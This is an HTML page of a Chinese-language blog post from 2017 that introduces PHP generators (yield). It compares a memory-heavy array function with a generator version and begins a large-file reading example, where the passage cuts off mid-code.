          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520190070791.html" itemprop="url">PHP中被忽略的性能优化利器：生成器</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T14:39:42+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&#x5982;&#x679C;&#x662F;&#x505A;Python&#x6216;&#x8005;&#x5176;&#x4ED6;&#x8BED;&#x8A00;&#x7684;&#x5C0F;&#x4F19;&#x4F34;&#xFF0C;&#x5BF9;&#x4E8E;&#x751F;&#x6210;&#x5668;&#x5E94;&#x8BE5;&#x4E0D;&#x964C;&#x751F;&#x3002;&#x4F46;&#x5F88;&#x591A;PHP&#x5F00;&#x53D1;&#x8005;&#x6216;&#x8BB8;&#x90FD;&#x4E0D;&#x77E5;&#x9053;&#x751F;&#x6210;&#x5668;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x56E0;&#x4E3A;&#x751F;&#x6210;&#x5668;&#x662F;PHP 5.5.0&#x624D;&#x5F15;&#x5165;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x751F;&#x6210;&#x5668;&#x4F5C;&#x7528;&#x4E0D;&#x662F;&#x5F88;&#x660E;&#x663E;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x751F;&#x6210;&#x5668;&#x529F;&#x80FD;&#x7684;&#x786E;&#x975E;&#x5E38;&#x6709;&#x7528;&#x3002;</p>
<h2 id="&#x4F18;&#x70B9;"><a href="#&#x4F18;&#x70B9;" class="headerlink" title="&#x4F18;&#x70B9;"></a>&#x4F18;&#x70B9;</h2><p>&#x76F4;&#x63A5;&#x8BB2;&#x6982;&#x5FF5;&#x4F30;&#x8BA1;&#x4F60;&#x542C;&#x5B8C;&#x8FD8;&#x662F;&#x4E00;&#x5934;&#x96FE;&#x6C34;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x8BF4;&#x8BF4;&#x4F18;&#x70B9;&#xFF0C;&#x4E5F;&#x8BB8;&#x80FD;&#x52FE;&#x8D77;&#x4F60;&#x7684;&#x5174;&#x8DA3;&#x3002;&#x90A3;&#x4E48;&#x751F;&#x6210;&#x5668;&#x6709;&#x54EA;&#x4E9B;&#x4F18;&#x70B9;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</p>
<ul>
<li>&#x751F;&#x6210;&#x5668;&#x4F1A;&#x5BF9;PHP&#x5E94;&#x7528;&#x7684;&#x6027;&#x80FD;&#x6709;&#x975E;&#x5E38;&#x5927;&#x7684;&#x5F71;&#x54CD;</li>
<li>PHP&#x4EE3;&#x7801;&#x8FD0;&#x884C;&#x65F6;&#x8282;&#x7701;&#x5927;&#x91CF;&#x7684;&#x5185;&#x5B58;</li>
<li>&#x6BD4;&#x8F83;&#x9002;&#x5408;&#x8BA1;&#x7B97;&#x5927;&#x91CF;&#x7684;&#x6570;&#x636E;</li>
</ul>
<p>&#x90A3;&#x4E48;&#xFF0C;&#x8FD9;&#x4E9B;&#x795E;&#x5947;&#x7684;&#x529F;&#x80FD;&#x7A76;&#x7ADF;&#x662F;&#x5982;&#x4F55;&#x505A;&#x5230;&#x7684;&#xFF1F;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#x3002;</p>
<h2 id="&#x6982;&#x5FF5;&#x5F15;&#x5165;"><a href="#&#x6982;&#x5FF5;&#x5F15;&#x5165;" class="headerlink" title="&#x6982;&#x5FF5;&#x5F15;&#x5165;"></a>&#x6982;&#x5FF5;&#x5F15;&#x5165;</h2><p>&#x9996;&#x5148;&#xFF0C;&#x653E;&#x4E0B;&#x751F;&#x6210;&#x5668;&#x6982;&#x5FF5;&#x7684;&#x5305;&#x88B1;&#xFF0C;&#x6765;&#x770B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;PHP&#x51FD;&#x6570;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;function createRange($number){</span><br><span class="line">    $data = [];</span><br><span class="line">    for($i=0;$i&lt;$number;$i++){</span><br><span class="line">        $data[] = time();</span><br><span class="line">    }</span><br><span class="line">    return $data;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x975E;&#x5E38;&#x5E38;&#x89C1;&#x7684;PHP&#x51FD;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x5728;&#x5904;&#x7406;&#x4E00;&#x4E9B;&#x6570;&#x7EC4;&#x7684;&#x65F6;&#x5019;&#x7ECF;&#x5E38;&#x4F1A;&#x4F7F;&#x7528;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x4EE3;&#x7801;&#x4E5F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF1A;</p>
<ol>
<li>&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x3002;</li>
<li>&#x51FD;&#x6570;&#x5185;&#x5305;&#x542B;&#x4E00;&#x4E2A;<code>for</code>&#x5FAA;&#x73AF;&#xFF0C;&#x6211;&#x4EEC;&#x5FAA;&#x73AF;&#x7684;&#x628A;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x653E;&#x5230;<code>$data</code>&#x91CC;&#x9762;</li>
<li><code>for</code>&#x5FAA;&#x73AF;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#xFF0C;&#x628A;<code>$data</code>&#x8FD4;&#x56DE;&#x51FA;&#x53BB;&#x3002;</li>
</ol>
<p>&#x4E0B;&#x9762;&#x6CA1;&#x5B8C;&#xFF0C;&#x6211;&#x4EEC;&#x7EE7;&#x7EED;&#x3002;&#x6211;&#x4EEC;&#x518D;&#x5199;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x628A;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5FAA;&#x73AF;&#x6253;&#x5370;&#x51FA;&#x6765;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$result = createRange(10); // &#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E0A;&#x9762;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x7684;&#x51FD;&#x6570;</span><br><span class="line">foreach($result as $value){</span><br><span class="line">    sleep(1);//&#x8FD9;&#x91CC;&#x505C;&#x987F;1&#x79D2;&#xFF0C;&#x6211;&#x4EEC;&#x540E;&#x7EED;&#x6709;&#x7528;</span><br><span class="line">    echo $value.&apos;&lt;br /&gt;&apos;;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x6211;&#x4EEC;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x91CC;&#x9762;&#x770B;&#x4E00;&#x4E0B;&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;</p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/bf99cec52ce512821d062465413769d47d58c0180946e40b0fb32a0bcbba5fa3" alt></p>
<p>&#x8FD9;&#x91CC;&#x975E;&#x5E38;&#x5B8C;&#x7F8E;&#xFF0C;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x95EE;&#x9898;&#x3002;&#xFF08;&#x5F53;&#x7136;<code>sleep(1)</code>&#x6548;&#x679C;&#x4F60;&#x4EEC;&#x770B;&#x4E0D;&#x51FA;&#x6765;&#xFF09;</p>
<h2 id="&#x601D;&#x8003;&#x4E00;&#x4E2A;&#x95EE;&#x9898;"><a href="#&#x601D;&#x8003;&#x4E00;&#x4E2A;&#x95EE;&#x9898;" class="headerlink" title="&#x601D;&#x8003;&#x4E00;&#x4E2A;&#x95EE;&#x9898;"></a>&#x601D;&#x8003;&#x4E00;&#x4E2A;&#x95EE;&#x9898;</h2><p>&#x6211;&#x4EEC;&#x6CE8;&#x610F;&#x5230;&#xFF0C;&#x5728;&#x8C03;&#x7528;&#x51FD;&#x6570;<code>createRange</code>&#x7684;&#x65F6;&#x5019;&#x7ED9;<code>$number</code>&#x7684;&#x4F20;&#x503C;&#x662F;10&#xFF0C;&#x4E00;&#x4E2A;&#x5F88;&#x5C0F;&#x7684;&#x6570;&#x5B57;&#x3002;&#x5047;&#x8BBE;&#xFF0C;&#x73B0;&#x5728;&#x4F20;&#x9012;&#x4E00;&#x4E2A;&#x503C;<code>10000000</code>&#xFF08;1000&#x4E07;&#xFF09;&#x3002;</p>
<p>&#x90A3;&#x4E48;&#xFF0C;&#x5728;&#x51FD;&#x6570;<code>createRange</code>&#x91CC;&#x9762;&#xFF0C;<code>for</code>&#x5FAA;&#x73AF;&#x5C31;&#x9700;&#x8981;&#x6267;&#x884C;<code>1000</code>&#x4E07;&#x6B21;&#x3002;&#x4E14;&#x6709;<code>1000</code>&#x4E07;&#x4E2A;&#x503C;&#x88AB;&#x653E;&#x5230;<code>$data</code>&#x91CC;&#x9762;&#xFF0C;&#x800C;<code>$data</code>&#x6570;&#x7EC4;&#x5728;&#x662F;&#x88AB;&#x653E;&#x5728;&#x5185;&#x5B58;&#x5185;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5728;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x65F6;&#x5019;&#x4F1A;&#x5360;&#x7528;&#x5927;&#x91CF;&#x5185;&#x5B58;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#xFF0C;&#x751F;&#x6210;&#x5668;&#x5C31;&#x53EF;&#x4EE5;&#x5927;&#x663E;&#x8EAB;&#x624B;&#x4E86;&#x3002;</p>
<h2 id="&#x521B;&#x5EFA;&#x751F;&#x6210;&#x5668;"><a href="#&#x521B;&#x5EFA;&#x751F;&#x6210;&#x5668;" class="headerlink" title="&#x521B;&#x5EFA;&#x751F;&#x6210;&#x5668;"></a>&#x521B;&#x5EFA;&#x751F;&#x6210;&#x5668;</h2><p>&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x4EE3;&#x7801;&#xFF0C;&#x4F60;&#x4EEC;&#x6CE8;&#x610F;&#x89C2;&#x5BDF;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;function createRange($number){</span><br><span class="line">    for($i=0;$i&lt;$number;$i++){</span><br><span class="line">        yield time();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x770B;&#x4E0B;&#x8FD9;&#x6BB5;&#x548C;&#x521A;&#x521A;&#x5F88;&#x50CF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x5220;&#x9664;&#x4E86;&#x6570;&#x7EC4;<code>$data</code>&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x6CA1;&#x6709;&#x8FD4;&#x56DE;&#x4EFB;&#x4F55;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x662F;&#x5728;<code>time()</code>&#x4E4B;&#x524D;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x4E2A;&#x5173;&#x952E;&#x5B57;<code>yield</code></p>
<h2 id="&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;"><a href="#&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;" class="headerlink" title="&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;"></a>&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;</h2><p>&#x6211;&#x4EEC;&#x518D;&#x8FD0;&#x884C;&#x4E00;&#x4E0B;&#x7B2C;&#x4E8C;&#x6BB5;&#x4EE3;&#x7801;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;$result = createRange(10); // &#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E0A;&#x9762;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x7684;&#x51FD;&#x6570;</span><br><span class="line">foreach($result as $value){</span><br><span class="line">    sleep(1);</span><br><span class="line">    echo $value.&apos;&lt;br /&gt;&apos;;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/098a36bac064c0f2c3024c19da43ac4052aacee252f6f57f5ca12c5fd7f35144" alt></p>
<p>&#x6211;&#x4EEC;&#x5947;&#x8FF9;&#x822C;&#x7684;&#x53D1;&#x73B0;&#x4E86;&#xFF0C;&#x8F93;&#x51FA;&#x7684;&#x503C;&#x548C;&#x7B2C;&#x4E00;&#x6B21;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;&#x7684;&#x4E0D;&#x4E00;&#x6837;&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x503C;&#xFF08;&#x65F6;&#x95F4;&#x6233;&#xFF09;&#x4E2D;&#x95F4;&#x95F4;&#x9694;&#x4E86;1&#x79D2;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x7684;&#x95F4;&#x9694;&#x4E00;&#x79D2;&#x5176;&#x5B9E;&#x5C31;&#x662F;<code>sleep(1)</code>&#x9020;&#x6210;&#x7684;&#x540E;&#x679C;&#x3002;&#x4F46;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x7B2C;&#x4E00;&#x6B21;&#x6CA1;&#x6709;&#x95F4;&#x9694;&#xFF1F;&#x90A3;&#x662F;&#x56E0;&#x4E3A;&#xFF1A;</p>
<ul>
<li>&#x672A;&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;&#x65F6;&#xFF1A;<code>createRange</code>&#x51FD;&#x6570;&#x5185;&#x7684;<code>for</code>&#x5FAA;&#x73AF;&#x7ED3;&#x679C;&#x88AB;&#x5F88;&#x5FEB;&#x653E;&#x5230;<code>$data</code>&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x7ACB;&#x5373;&#x8FD4;&#x56DE;&#x3002;&#x6240;&#x4EE5;&#xFF0C;<code>foreach</code>&#x5FAA;&#x73AF;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x7684;&#x6570;&#x7EC4;&#x3002;</li>
<li>&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;&#x65F6;&#xFF1A;<code>createRange</code>&#x7684;&#x503C;&#x4E0D;&#x662F;&#x4E00;&#x6B21;&#x6027;&#x5FEB;&#x901F;&#x751F;&#x6210;&#xFF0C;&#x800C;&#x662F;&#x4F9D;&#x8D56;&#x4E8E;<code>foreach</code>&#x5FAA;&#x73AF;&#x3002;<code>foreach</code>&#x5FAA;&#x73AF;&#x4E00;&#x6B21;&#xFF0C;<code>for</code>&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;</li>
</ul>
<p>&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x4F60;&#x5E94;&#x8BE5;&#x5BF9;&#x751F;&#x6210;&#x5668;&#x6709;&#x70B9;&#x513F;&#x5934;&#x7EEA;&#x3002;</p>
<h2 id="&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x751F;&#x6210;&#x5668;"><a href="#&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x751F;&#x6210;&#x5668;" class="headerlink" title="&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x751F;&#x6210;&#x5668;"></a>&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x751F;&#x6210;&#x5668;</h2><h3 id="&#x4EE3;&#x7801;&#x5256;&#x6790;"><a href="#&#x4EE3;&#x7801;&#x5256;&#x6790;" class="headerlink" title="&#x4EE3;&#x7801;&#x5256;&#x6790;"></a>&#x4EE3;&#x7801;&#x5256;&#x6790;</h3><p>&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x6765;&#x5BF9;&#x4E8E;&#x521A;&#x521A;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x5256;&#x6790;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;function createRange($number){</span><br><span class="line">    for($i=0;$i&lt;$number;$i++){</span><br><span class="line">        yield time();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$result = createRange(10); // &#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x4E0A;&#x9762;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x7684;&#x51FD;&#x6570;</span><br><span class="line">foreach($result as $value){</span><br><span class="line">    sleep(1);</span><br><span class="line">    echo $value.&apos;&lt;br /&gt;&apos;;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>&#x6211;&#x4EEC;&#x6765;&#x8FD8;&#x539F;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x3002;</p>
<ol>
<li>&#x9996;&#x5148;&#x8C03;&#x7528;<code>createRange</code>&#x51FD;&#x6570;&#xFF0C;&#x4F20;&#x5165;&#x53C2;&#x6570;<code>10</code>&#xFF0C;&#x4F46;&#x662F;<code>for</code>&#x503C;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x6B21;&#x7136;&#x540E;&#x505C;&#x6B62;&#x4E86;&#xFF0C;&#x5E76;&#x4E14;&#x544A;&#x8BC9;<code>foreach</code>&#x7B2C;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#x53EF;&#x4EE5;&#x7528;&#x7684;&#x503C;&#x3002;</li>
<li><code>foreach</code>&#x5F00;&#x59CB;&#x5BF9;<code>$result</code>&#x5FAA;&#x73AF;&#xFF0C;&#x8FDB;&#x6765;&#x9996;&#x5148;<code>sleep(1)</code>&#xFF0C;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x4F7F;&#x7528;<code>for</code>&#x7ED9;&#x7684;&#x4E00;&#x4E2A;&#x503C;&#x6267;&#x884C;&#x8F93;&#x51FA;&#x3002;</li>
<li><code>foreach</code>&#x51C6;&#x5907;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x5F00;&#x59CB;&#x7B2C;&#x4E8C;&#x6B21;&#x5FAA;&#x73AF;&#x4E4B;&#x524D;&#xFF0C;&#x5B83;&#x5411;<code>for</code>&#x5FAA;&#x73AF;&#x53C8;&#x8BF7;&#x6C42;&#x4E86;&#x4E00;&#x6B21;&#x3002;</li>
<li><code>for</code>&#x5FAA;&#x73AF;&#x4E8E;&#x662F;&#x53C8;&#x6267;&#x884C;&#x4E86;&#x4E00;&#x6B21;&#xFF0C;&#x5C06;&#x751F;&#x6210;&#x7684;&#x65F6;&#x95F4;&#x6233;&#x544A;&#x8BC9;<code>foreach</code>.</li>
<li><code>foreach</code>&#x62FF;&#x5230;&#x7B2C;&#x4E8C;&#x4E2A;&#x503C;&#xFF0C;&#x5E76;&#x4E14;&#x8F93;&#x51FA;&#x3002;&#x7531;&#x4E8E;<code>foreach</code>&#x4E2D;<code>sleep(1)</code>&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;<code>for</code>&#x5FAA;&#x73AF;&#x5EF6;&#x8FDF;&#x4E86;1&#x79D2;&#x751F;&#x6210;&#x5F53;&#x524D;&#x65F6;&#x95F4;</li>
</ol>
<p>&#x6240;&#x4EE5;&#xFF0C;&#x6574;&#x4E2A;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x4E2D;&#xFF0C;&#x59CB;&#x7EC8;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x8BB0;&#x5F55;&#x503C;&#x53C2;&#x4E0E;&#x5FAA;&#x73AF;&#xFF0C;&#x5185;&#x5B58;&#x4E2D;&#x4E5F;&#x53EA;&#x6709;&#x4E00;&#x6761;&#x4FE1;&#x606F;&#x3002;</p>
<p>&#x65E0;&#x8BBA;&#x5F00;&#x59CB;&#x4F20;&#x5165;&#x7684;<code>$number</code>&#x6709;&#x591A;&#x5927;&#xFF0C;&#x7531;&#x4E8E;&#x5E76;&#x4E0D;&#x4F1A;&#x7ACB;&#x5373;&#x751F;&#x6210;&#x6240;&#x6709;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x6240;&#x4EE5;&#x5185;&#x5B58;&#x59CB;&#x7EC8;&#x662F;&#x4E00;&#x6761;&#x5FAA;&#x73AF;&#x7684;&#x503C;&#x3002;</p>
<h3 id="&#x6982;&#x5FF5;&#x7406;&#x89E3;"><a href="#&#x6982;&#x5FF5;&#x7406;&#x89E3;" class="headerlink" title="&#x6982;&#x5FF5;&#x7406;&#x89E3;"></a>&#x6982;&#x5FF5;&#x7406;&#x89E3;</h3><p>&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x4F60;&#x5E94;&#x8BE5;&#x5DF2;&#x7ECF;&#x5927;&#x6982;&#x7406;&#x89E3;&#x4EC0;&#x4E48;&#x662F;&#x751F;&#x6210;&#x5668;&#x4E86;&#x3002;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x6765;&#x8BF4;&#x4E0B;&#x751F;&#x6210;&#x5668;&#x539F;&#x7406;&#x3002;</p>
<p>&#x9996;&#x5148;&#x660E;&#x786E;&#x4E00;&#x4E2A;&#x6982;&#x5FF5;&#xFF1A;<strong>&#x751F;&#x6210;&#x5668;yield&#x5173;&#x952E;&#x5B57;&#x4E0D;&#x662F;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x4ED6;&#x7684;&#x4E13;&#x4E1A;&#x672F;&#x8BED;&#x53EB;&#x4EA7;&#x51FA;&#x503C;&#xFF0C;&#x53EA;&#x662F;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x503C;</strong></p>
<p>&#x90A3;&#x4E48;&#x4EE3;&#x7801;&#x4E2D;<code>foreach</code>&#x5FAA;&#x73AF;&#x7684;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;&#x5176;&#x5B9E;&#x662F;PHP&#x5728;&#x4F7F;&#x7528;&#x751F;&#x6210;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;<code>Generator</code>&#x7C7B;&#x7684;&#x5BF9;&#x8C61;&#x3002;<code>foreach</code>&#x53EF;&#x4EE5;&#x5BF9;&#x8BE5;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x8FED;&#x4EE3;&#xFF0C;&#x6BCF;&#x4E00;&#x6B21;&#x8FED;&#x4EE3;&#xFF0C;PHP&#x4F1A;&#x901A;&#x8FC7;<code>Generator</code>&#x5B9E;&#x4F8B;&#x8BA1;&#x7B97;&#x51FA;&#x4E0B;&#x4E00;&#x6B21;&#x9700;&#x8981;&#x8FED;&#x4EE3;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x6837;<code>foreach</code>&#x5C31;&#x77E5;&#x9053;&#x4E0B;&#x4E00;&#x6B21;&#x9700;&#x8981;&#x8FED;&#x4EE3;&#x7684;&#x503C;&#x4E86;&#x3002;</p>
<p>&#x800C;&#x4E14;&#xFF0C;&#x5728;&#x8FD0;&#x884C;&#x4E2D;<code>for</code>&#x5FAA;&#x73AF;&#x6267;&#x884C;&#x540E;&#xFF0C;&#x4F1A;&#x7ACB;&#x5373;&#x505C;&#x6B62;&#x3002;&#x7B49;&#x5F85;<code>foreach</code>&#x4E0B;&#x6B21;&#x5FAA;&#x73AF;&#x65F6;&#x5019;&#x518D;&#x6B21;&#x548C;<code>for</code>&#x7D22;&#x8981;&#x4E0B;&#x6B21;&#x7684;&#x503C;&#x7684;&#x65F6;&#x5019;&#xFF0C;<code>for</code>&#x5FAA;&#x73AF;&#x624D;&#x4F1A;&#x518D;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF0C;&#x7136;&#x540E;&#x7ACB;&#x5373;&#x518D;&#x6B21;&#x505C;&#x6B62;&#x3002;&#x76F4;&#x5230;&#x4E0D;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;&#x4E0D;&#x6267;&#x884C;&#x7ED3;&#x675F;&#x3002;</p>
<h2 id="&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x5E94;&#x7528;"><a href="#&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x5E94;&#x7528;" class="headerlink" title="&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x5E94;&#x7528;"></a>&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x5E94;&#x7528;</h2><p>&#x5F88;&#x591A;PHP&#x5F00;&#x53D1;&#x8005;&#x4E0D;&#x4E86;&#x89E3;&#x751F;&#x6210;&#x5668;&#xFF0C;&#x5176;&#x5B9E;&#x4E3B;&#x8981;&#x662F;&#x4E0D;&#x4E86;&#x89E3;&#x5E94;&#x7528;&#x9886;&#x57DF;&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x751F;&#x6210;&#x5668;&#x5728;&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x4E2D;&#x6709;&#x54EA;&#x4E9B;&#x5E94;&#x7528;&#xFF1F;</p>
<h3 id="&#x8BFB;&#x53D6;&#x8D85;&#x5927;&#x6587;&#x4EF6;"><a href="#&#x8BFB;&#x53D6;&#x8D85;&#x5927;&#x6587;&#x4EF6;" class="headerlink" title="&#x8BFB;&#x53D6;&#x8D85;&#x5927;&#x6587;&#x4EF6;"></a>&#x8BFB;&#x53D6;&#x8D85;&#x5927;&#x6587;&#x4EF6;</h3><p>PHP&#x5F00;&#x53D1;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x90FD;&#x8981;&#x8BFB;&#x53D6;&#x5927;&#x6587;&#x4EF6;&#xFF0C;&#x6BD4;&#x5982;csv&#x6587;&#x4EF6;&#x3001;text&#x6587;&#x4EF6;&#xFF0C;&#x6216;&#x8005;&#x4E00;&#x4E9B;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x5982;&#x679C;&#x5F88;&#x5927;&#xFF0C;&#x6BD4;&#x5982;5&#x4E2A;G&#x3002;&#x8FD9;&#x65F6;&#xFF0C;&#x76F4;&#x63A5;&#x4E00;&#x6B21;&#x6027;&#x628A;&#x6240;&#x6709;&#x7684;&#x5185;&#x5BB9;&#x8BFB;&#x53D6;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x8BA1;&#x7B97;&#x4E0D;&#x592A;&#x73B0;&#x5B9E;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x751F;&#x6210;&#x5668;&#x5C31;&#x53EF;&#x4EE5;&#x6D3E;&#x4E0A;&#x7528;&#x573A;&#x5566;&#x3002;&#x7B80;&#x5355;&#x770B;&#x4E2A;&#x4F8B;&#x5B50;&#xFF1A;&#x8BFB;&#x53D6;text&#x6587;&#x4EF6;</p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/8ec7a18e6f2e76ad87a78c4fa9dd42189678a3f19aff2e5c3847a7da80141fc5" alt></p>
<p>&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;text&#x6587;&#x672C;&#x6587;&#x6863;&#xFF0C;&#x5E76;&#x5728;&#x5176;&#x4E2D;&#x8F93;&#x5165;&#x51E0;&#x884C;&#x6587;&#x5B57;&#xFF0C;&#x793A;&#x8303;&#x8BFB;&#x53D6;&#x3002;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">function readTxt()</span><br><span class="line">{</span><br><span class="line">    # code...</span><br><span class="line">    $handle = fopen(&quot;./test.txt&quot;, &apos;rb&apos;);</span><br><span class="line"></span><br><span class="line">    while (feof($handle)===false) {</span><br><span class="line">        # code...</span><br><span class="line">        yield fgets($handle);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    